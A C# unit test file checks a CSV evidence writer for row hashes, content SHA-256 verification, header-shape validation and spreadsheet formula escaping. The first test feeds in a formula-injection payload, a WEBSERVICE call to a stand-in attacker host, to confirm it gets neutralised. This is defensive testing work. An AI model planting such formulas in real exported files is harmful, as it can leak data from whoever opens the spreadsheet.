using System.Security.Cryptography;
using BudgetManager.Application.Exports;

namespace BudgetManager.Infrastructure.Tests.Exports;

public sealed class EvidenceCsvWriterTests
{
    [Fact]
    public void Write_adds_verifiable_row_hash_and_blocks_spreadsheet_formulas()
    {
        var document = EvidenceCsvWriter.Write(
            ["login", "amount"],
            [["=WEBSERVICE(\"https://attacker.example\")", 12.5m]]);

        var csv = System.Text.Encoding.UTF8.GetString(document.Content);
        Assert.Contains("'=WEBSERVICE", csv, StringComparison.Ordinal);
        Assert.Contains("row_sha256", csv, StringComparison.Ordinal);
        Assert.Equal(1, document.RowCount);
        Assert.Equal(
            document.ContentSha256,
            Convert.ToHexString(SHA256.HashData(document.Content)));
    }

    [Fact]
    public void Write_rejects_rows_that_do_not_match_the_header_shape()
    {
        Assert.Throws<ArgumentException>(() => EvidenceCsvWriter.Write(["one"], [["one", "two"]]));
    }
}
